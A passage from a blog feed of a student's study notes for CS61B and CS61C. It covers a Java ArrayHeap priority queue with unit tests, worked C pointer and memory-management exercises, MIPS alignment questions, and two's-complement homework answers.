class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> T myItem;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">double</span> myPriority;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">Node</span><span class="params">(T item, <span class="keyword">double</span> priority)</span> </span>&#123;</span><br><span class="line">            myItem = item;</span><br><span class="line">            myPriority = priority;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> T <span class="title">item</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> myItem;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">priority</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> myPriority;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> myItem.toString() + <span class="string">", "</span> + myPriority;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Helper function to resize the backing array when necessary. */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        Node[] temp = <span class="keyword">new</span> ArrayHeap.Node[capacity];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="keyword">this</span>.contents.length; i++) &#123;</span><br><span class="line">            temp[i] = <span class="keyword">this</span>.contents[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.contents = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testIndexing</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        assertEquals(<span class="number">6</span>, leftIndex(<span class="number">3</span>));</span><br><span class="line">        assertEquals(<span class="number">10</span>, leftIndex(<span class="number">5</span>));</span><br><span class="line">        assertEquals(<span class="number">7</span>, rightIndex(<span class="number">3</span>));</span><br><span class="line">        assertEquals(<span class="number">11</span>, rightIndex(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">        assertEquals(<span class="number">3</span>, parentIndex(<span class="number">6</span>));</span><br><span class="line">        assertEquals(<span class="number">5</span>, parentIndex(<span class="number">10</span>));</span><br><span class="line">        assertEquals(<span class="number">3</span>, parentIndex(<span class="number">7</span>));</span><br><span class="line">        assertEquals(<span class="number">5</span>, parentIndex(<span class="number">11</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSwim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ArrayHeap&lt;String&gt; pq = <span class="keyword">new</span> ArrayHeap&lt;&gt;();</span><br><span class="line">        pq.size = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">7</span>; i += <span class="number">1</span>) &#123;</span><br><span class="line">            pq.contents[i] = <span class="keyword">new</span> ArrayHeap&lt;String&gt;.Node(<span class="string">"x"</span> + i, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Change item x6's priority to a low value.</span></span><br><span class="line"></span><br><span class="line">        pq.contents[<span class="number">6</span>].myPriority = <span class="number">0</span>;</span><br><span class="line">        System.out.println(<span class="string">"PQ before swimming:"</span>);</span><br><span class="line">        System.out.println(pq);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Swim x6 upwards. It should reach the root.</span></span><br><span class="line"></span><br><span class="line">        pq.swim(<span class="number">6</span>);</span><br><span class="line">        System.out.println(<span class="string">"PQ after swimming:"</span>);</span><br><span class="line">        System.out.println(pq);</span><br><span class="line">        assertEquals(<span class="string">"x6"</span>, pq.contents[<span class="number">1</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x2"</span>, pq.contents[<span class="number">2</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x1"</span>, pq.contents[<span class="number">3</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x4"</span>, pq.contents[<span class="number">4</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x5"</span>, pq.contents[<span class="number">5</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x3"</span>, pq.contents[<span class="number">6</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x7"</span>, pq.contents[<span class="number">7</span>].myItem);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSink</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ArrayHeap&lt;String&gt; pq = <span class="keyword">new</span> ArrayHeap&lt;&gt;();</span><br><span class="line">        pq.size = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">7</span>; i += <span class="number">1</span>) &#123;</span><br><span class="line">            pq.contents[i] = <span class="keyword">new</span> ArrayHeap&lt;String&gt;.Node(<span class="string">"x"</span> + i, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Change root's priority to a large value.</span></span><br><span class="line">        pq.contents[<span class="number">1</span>].myPriority = <span class="number">10</span>;</span><br><span class="line">        System.out.println(<span class="string">"PQ before sinking:"</span>);</span><br><span class="line">        System.out.println(pq);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sink the root.</span></span><br><span class="line">        pq.sink(<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">"PQ after sinking:"</span>);</span><br><span class="line">        System.out.println(pq);</span><br><span class="line">        assertEquals(<span class="string">"x2"</span>, pq.contents[<span class="number">1</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x4"</span>, pq.contents[<span class="number">2</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x3"</span>, pq.contents[<span class="number">3</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x1"</span>, pq.contents[<span class="number">4</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x5"</span>, pq.contents[<span class="number">5</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x6"</span>, pq.contents[<span class="number">6</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"x7"</span>, pq.contents[<span class="number">7</span>].myItem);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testInsert</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ArrayHeap&lt;String&gt; pq = <span class="keyword">new</span> ArrayHeap&lt;&gt;();</span><br><span class="line">        pq.insert(<span class="string">"c"</span>, <span class="number">3</span>);</span><br><span class="line">        assertEquals(<span class="string">"c"</span>, pq.contents[<span class="number">1</span>].myItem);</span><br><span class="line"></span><br><span class="line">        pq.insert(<span class="string">"i"</span>, <span class="number">9</span>);</span><br><span class="line">        assertEquals(<span class="string">"i"</span>, pq.contents[<span class="number">2</span>].myItem);</span><br><span class="line"></span><br><span class="line">        pq.insert(<span class="string">"g"</span>, <span class="number">7</span>);</span><br><span class="line">        pq.insert(<span class="string">"d"</span>, <span class="number">4</span>);</span><br><span class="line">        assertEquals(<span class="string">"d"</span>, pq.contents[<span class="number">2</span>].myItem);</span><br><span class="line"></span><br><span class="line">        pq.insert(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">        assertEquals(<span class="string">"a"</span>, pq.contents[<span class="number">1</span>].myItem);</span><br><span class="line"></span><br><span class="line">        pq.insert(<span class="string">"h"</span>, <span class="number">8</span>);</span><br><span class="line">        pq.insert(<span class="string">"e"</span>, <span class="number">5</span>);</span><br><span class="line">        pq.insert(<span class="string">"b"</span>, <span class="number">2</span>);</span><br><span class="line">        pq.insert(<span class="string">"c"</span>, <span class="number">3</span>);</span><br><span class="line">        pq.insert(<span class="string">"d"</span>, <span class="number">4</span>);</span><br><span class="line">        System.out.println(<span class="string">"pq after inserting 10 items: "</span>);</span><br><span class="line">        System.out.println(pq);</span><br><span class="line">        assertEquals(<span class="number">10</span>, pq.size());</span><br><span class="line">        assertEquals(<span class="string">"a"</span>, pq.contents[<span class="number">1</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"b"</span>, pq.contents[<span class="number">2</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"e"</span>, pq.contents[<span class="number">3</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"c"</span>, pq.contents[<span class="number">4</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"d"</span>, pq.contents[<span class="number">5</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"h"</span>, pq.contents[<span class="number">6</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"g"</span>, pq.contents[<span class="number">7</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"i"</span>, pq.contents[<span class="number">8</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"c"</span>, pq.contents[<span class="number">9</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"d"</span>, pq.contents[<span class="number">10</span>].myItem);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testInsertAndRemoveOnce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ArrayHeap&lt;String&gt; pq = <span class="keyword">new</span> ArrayHeap&lt;&gt;();</span><br><span class="line">        pq.insert(<span class="string">"c"</span>, <span class="number">3</span>);</span><br><span class="line">        pq.insert(<span class="string">"i"</span>, <span class="number">9</span>);</span><br><span class="line">        pq.insert(<span class="string">"g"</span>, <span class="number">7</span>);</span><br><span class="line">        pq.insert(<span class="string">"d"</span>, <span class="number">4</span>);</span><br><span class="line">        pq.insert(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">        pq.insert(<span class="string">"h"</span>, <span class="number">8</span>);</span><br><span class="line">        pq.insert(<span class="string">"e"</span>, <span class="number">5</span>);</span><br><span class="line">        pq.insert(<span class="string">"b"</span>, <span class="number">2</span>);</span><br><span class="line">        pq.insert(<span class="string">"c"</span>, <span class="number">3</span>);</span><br><span class="line">        pq.insert(<span class="string">"d"</span>, <span class="number">4</span>);</span><br><span class="line">        String removed = pq.removeMin();</span><br><span class="line">        assertEquals(<span class="string">"a"</span>, removed);</span><br><span class="line">        assertEquals(<span class="number">9</span>, pq.size());</span><br><span class="line">        assertEquals(<span class="string">"b"</span>, pq.contents[<span class="number">1</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"c"</span>, pq.contents[<span class="number">2</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"e"</span>, pq.contents[<span class="number">3</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"c"</span>, pq.contents[<span class="number">4</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"d"</span>, pq.contents[<span class="number">5</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"h"</span>, pq.contents[<span class="number">6</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"g"</span>, pq.contents[<span class="number">7</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"i"</span>, pq.contents[<span class="number">8</span>].myItem);</span><br><span class="line">        assertEquals(<span class="string">"d"</span>, pq.contents[<span class="number">9</span>].myItem);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testInsertAndRemoveAllButLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ExtrinsicPQ&lt;String&gt; pq = <span class="keyword">new</span> ArrayHeap&lt;&gt;();</span><br><span class="line">        pq.insert(<span class="string">"c"</span>, <span class="number">3</span>);</span><br><span class="line">        pq.insert(<span class="string">"i"</span>, <span class="number">9</span>);</span><br><span class="line">        pq.insert(<span class="string">"g"</span>, <span class="number">7</span>);</span><br><span class="line">        pq.insert(<span class="string">"d"</span>, <span class="number">4</span>);</span><br><span class="line">        pq.insert(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">        pq.insert(<span class="string">"h"</span>, <span class="number">8</span>);</span><br><span class="line">        pq.insert(<span class="string">"e"</span>, <span class="number">5</span>);</span><br><span class="line">        pq.insert(<span class="string">"b"</span>, <span class="number">2</span>);</span><br><span class="line">        pq.insert(<span class="string">"c"</span>, <span class="number">3</span>);</span><br><span class="line">        pq.insert(<span class="string">"d"</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        String[] expected = &#123;<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>, <span class="string">"c"</span>, <span class="string">"d"</span>, <span class="string">"d"</span>, <span class="string">"e"</span>, <span class="string">"g"</span>, <span class="string">"h"</span>, <span class="string">"i"</span>&#125;;</span><br><span class="line">        <span class="keyword">while</span> (pq.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            assertEquals(expected[i], pq.removeMin());</span><br><span class="line">            i += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61c-disc02</title>
    <url>/2018/09/22/cs61c-disc01/</url>
    <content><![CDATA[<h1 id="Q1-Uncommented-Code-Yuck"><a href="#Q1-Uncommented-Code-Yuck" class="headerlink" title="Q1 Uncommented Code? Yuck!"></a>Q1 Uncommented Code? Yuck!</h1><p>The following functions work correctly (note: this does not mean intelligently), but have no comments. Document the code to prevent it from causing further confusion.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*   recursively calculate array first n term sum</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *arr, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n ? arr[<span class="number">0</span>] + foo(arr + <span class="number">1</span>, n - <span class="number">1</span>) : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">2.</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">*   By reversed order to calculate the sum when current term is zero(i.e. if there's zero, plus 1).return bitwise invert plus 1 result(i.e. two's complement).The whole function calculate zero's count times -1.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bar</span><span class="params">(<span class="keyword">int</span> *arr, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, i;</span><br><span class="line">    <span class="keyword">for</span> (i = n; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        sum += !arr[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ~sum + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*   some xor operations, does nothing.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baz</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    x = x ^ y;</span><br><span class="line">    y = x ^ y;</span><br><span class="line">    x = x ^ y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Q2-Programming-with-Pointers"><a href="#Q2-Programming-with-Pointers" class="headerlink" title="Q2 Programming with Pointers"></a>Q2 Programming with Pointers</h1><p>Implement the following functions so that they perform as described in the comment.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Swaps the value of two ints outside of this function. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *x, <span class="keyword">int</span> *y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = *x;</span><br><span class="line">    *x = *y;</span><br><span class="line">    *y = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Increments the value of an int outside of this function by one. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment</span><span class="params">(<span class="keyword">int</span> *x)</span> </span>&#123;</span><br><span class="line">    *x += <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// (*x)++;</span></span><br><span class="line">    <span class="comment">// x[0]++;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Returns the number of bytes in a string. Does not use strlen. */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mystrlen</span><span class="params">(<span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str++) &#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Q3-Problem"><a href="#Q3-Problem" class="headerlink" title="Q3 Problem?"></a>Q3 Problem?</h1><p>The following code segments may contain logic and syntax errors. Find and correct them.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Returns the sum of all the elements in SUMMANDS. */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span>* summands)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(summands); i++)</span><br><span class="line">        sum += *(summands + i);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sizeof returns number of bytes in object,so we need to give the array length in parameters.The following is corrected answer.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Returns the sum of all the elements in SUMMANDS. */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span>* summands, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        sum += *(summands + i);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Increments all the letters in the string STRING, held in an array of length N.</span></span><br><span class="line"><span class="comment">* Does not modify any other memory which has been previously allocated. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment</span><span class="params">(<span class="keyword">char</span>* <span class="built_in">string</span>, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        *(<span class="built_in">string</span> + i)++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Because of ++ operator has higher precedance than <em>, So we can simply insert parenthesis around * operator.(i.e. (</em>(string + i))++);and we can also exploit the association between array and pointer.The follwing are corrected answers.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment</span><span class="params">(<span class="keyword">char</span>* <span class="built_in">string</span>, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="built_in">string</span>[i] != <span class="number">0</span>; i++)</span><br><span class="line">        <span class="built_in">string</span>[i]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment</span><span class="params">(<span class="keyword">char</span>* <span class="built_in">string</span>, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        (*(<span class="built_in">string</span> + i))++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Copies the string SRC to DST. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy</span><span class="params">(<span class="keyword">char</span>* src, <span class="keyword">char</span>* dst)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (*dst++ = *src++);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This has no errors.suffix increment first use * operator then execute plus operation,while loop stops until there is a zero which means string end.</p>
]]></content>
      <categories>
        <category>CS61C</category>
      </categories>
      <tags>
        <tag>Machine Structure</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61c-disc02</title>
    <url>/2018/10/11/cs61c-disc02/</url>
    <content><![CDATA[<h1 id="Q1-C-Memory-Management"><a href="#Q1-C-Memory-Management" class="headerlink" title="Q1 C Memory Management"></a>Q1 C Memory Management</h1><p>In which memory sections (CODE, STATIC, HEAP, STACK) do the following reside?</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> C 2</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> val = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">char</span> arr[] = <span class="string">"foo"</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str = (<span class="keyword">char</span> *) <span class="built_in">malloc</span> (C*val);</span><br><span class="line">    <span class="keyword">char</span> *ptr = arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>arg resides in STACK, str resides in STACK</li>
<li>arr resides in STATIC, *str resides in HEAP</li>
<li>val resides in CODE, C resides CODE</li>
</ul>
<p>What is wrong with the C code below?</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>* ptr = <span class="built_in">malloc</span>(<span class="number">4</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="keyword">if</span>(extra_large) ptr = <span class="built_in">malloc</span>(<span class="number">10</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="keyword">return</span> ptr;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>Memory leak if extra_large is TRUE.</p>
<p>Write code to prepend (add to the start) to a linked list, and to free/empty the entire list.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ll_node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ll_node</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_ll</span><span class="params">(struct ll_node** <span class="built_in">list</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*<span class="built_in">list</span> == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    free_ll(&amp;((*<span class="built_in">list</span>) -&gt; next));</span><br><span class="line">    <span class="built_in">free</span>(*<span class="built_in">list</span>);</span><br><span class="line">    *<span class="built_in">list</span> = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepend</span><span class="params">(struct ll_node** <span class="built_in">list</span>, <span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ll_node</span> *<span class="title">ll_p</span> = (<span class="title">struct</span> <span class="title">ll_node</span> *)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ll_node</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (ll_p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"memory exhausted\n"</span>);<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ll_p -&gt; value = value;</span><br><span class="line">    ll_p -&gt; next = *<span class="built_in">list</span>;</span><br><span class="line">    *<span class="built_in">list</span> = ll_p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>Note: list points to the first element of the list, or to NULL if the list is empty</em></p>
<h1 id="2-MIPS-Intro"><a href="#2-MIPS-Intro" class="headerlink" title="2 MIPS Intro"></a>2 MIPS Intro</h1>

<p>a) make arr[2] &lt;- 4<br>b) make $t0 &lt;- 0<br>c) alignment error<br>d) alignment error<br>e) out of bounds<br>f) make arr[3] &lt;- 6</p>
<p>In question 1, what other instructions could be used in place of each load/store without alignment errors?</p>
<p><span style="color:red">In a, we can use lb, lh because the number is 4, which in 2’s complement is 00000100 where the rest is all zero. sw can be replaced by sb and sh also.</span><br><span style="color:red">In b, lh can be replaced by lb and lw, the value to be transfered is zero.</span><br><span style="color:red">In e, sw can be replaced by sh, sb. The value is 8.</span><br><span style="color:red">In f, sw can be replaced by sh, sb because the value is 6</span></p>


<h1 id="3-Translating-between-C-and-MIPS"><a href="#3-Translating-between-C-and-MIPS" class="headerlink" title="3 Translating between C and MIPS"></a>3 Translating between C and MIPS</h1><p>Translate between the C and MIPS code. You may want to use the MIPS Green Sheet as a reference. In all of the C examples, we show you how the different variables map to registers – you don’t have to worry about the stack or any memory-related issues.</p>

]]></content>
      <categories>
        <category>CS61C</category>
      </categories>
      <tags>
        <tag>Machine Structure</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61c-hw00</title>
    <url>/2018/09/24/cs61c-hw00/</url>
    <content><![CDATA[<h1 id="Problem-2-Picking-representations"><a href="#Problem-2-Picking-representations" class="headerlink" title="Problem 2: Picking representations"></a>Problem 2: Picking representations</h1><p>Assume we are working with 8-bit numbers for the entirety of this question.</p>
<p>For each part below, you will be given a choice between unsigned and two’s complement. It’s your job to pick the better number representation for the given criteria, or denote that both representations are equally good. Explain your answer in one sentence or less.:</p>
<p>You would like to represent the temperature in degrees Celsius:</p>
<p><strong>We need 2’s complement becauseo of negative temperature.</strong></p>
<a id="more"></a>

<p>You would like to maximize the range (distance between most negative represented number, and most positive represented number):</p>
<p><strong>Both representations have the same distance between most negative and most positive numbers.</strong></p>
<p>You would like to represent the number of boxes a factory has shipped:</p>
<p><strong>This number will never be negative so unsigned can represent more useful numbers.</strong></p>
<h1 id="Problem-3-Counting"><a href="#Problem-3-Counting" class="headerlink" title="Problem 3: Counting"></a>Problem 3: Counting</h1><p>For a system of n-digit unsigned base 4 numbers (n &gt; 1), how many numbers can be represented?</p>
<p><strong>Since each bit can be represented by 0,1,2,3, so we can represent 4^n numbers.</strong></p>
<p>For an n-digit 2’s complement binary number (n &gt; 1), what is the number of negative integers?</p>
<p><strong>2^(n - 1),Because negative and positive which contains zero evenly divide the 2^n numbers.</strong></p>
<p>For an n-digit 2’s complement number (n &gt; 1), how many zeros are there?</p>
<p><strong>Only one!</strong></p>
<p>For an n-digit 2’s complement number (n &gt; 1), what is the difference between the most positive number and the most negative number?</p>
<p><strong>The most postive number is 2^(n - 1) -1, the most negative number is -2^(n - 1), so the difference is 2^n - 1.</strong></p>
<h1 id="Problem-4-Overflow"><a href="#Problem-4-Overflow" class="headerlink" title="Problem 4: Overflow"></a>Problem 4: Overflow</h1><p>The following addition and subtraction operations are to be carried out with 8-bit 2’s complement numbers. For each operation, calculate the result and label as OVERFLOW or CORRECT</p>
<p>Example: 1 + 2 = 0b0000 0001 + 0b0000 0010 = 0b0000 0011 = 3, CORRECT</p>
<p>64 + 64 = ?</p>
<p><strong>Answer is -128, which is overflow</strong></p>
<p>-127 + 30 = ?</p>
<p><strong>Answer is -97, which is correct</strong></p>
<p>-127 - 1 = ?</p>
<p><strong>Answer is -128, which is correct</strong></p>
<p>38 - 40 = ?</p>
